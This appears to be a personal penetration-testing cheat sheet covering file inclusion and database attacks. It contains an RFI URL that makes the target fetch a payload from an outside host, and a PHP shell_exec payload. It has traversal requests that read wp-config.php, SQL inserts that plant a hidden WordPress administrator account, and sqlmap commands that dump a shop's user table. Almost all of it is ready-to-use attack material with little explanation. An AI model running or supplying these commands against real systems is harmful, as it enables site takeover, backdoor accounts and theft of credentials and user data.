### LFI & RFI

* For a Remote File Inclusion look for php code that is not sanitized and passed to the PHP include function and the php.ini file must be configured to allow remote files

/etc/php5/cgi/php.ini - "allow_url_fopen" and "allow_url_include" both set to "on"

include($_REQUEST["file"].".php");

* Remote File Inclusion

http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt

<?php echo shell\_exec("ipconfig");?>

```
oneExample:
GET /../../../../xampp\php\extras\browscap.ini
GET /../../../../xampp/htdocs/blog/wp-config.php



### DB

#### Connect MariaDB
mysql -u root 10.10.10.10 -p Password@1

SQL Query for Wordpress:
```
INSERT INTO `databasename`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('4', 'demo', MD5('demo'), 'Your Name', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Your Name');
 
 
INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');
 
 
INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_user_level', '10');
```

#### SQLMAP
```
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --dbs
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --tables -D cscart
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --columns -D cscart -T cscart_users
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --dump -D cscart -T cscart_users
```

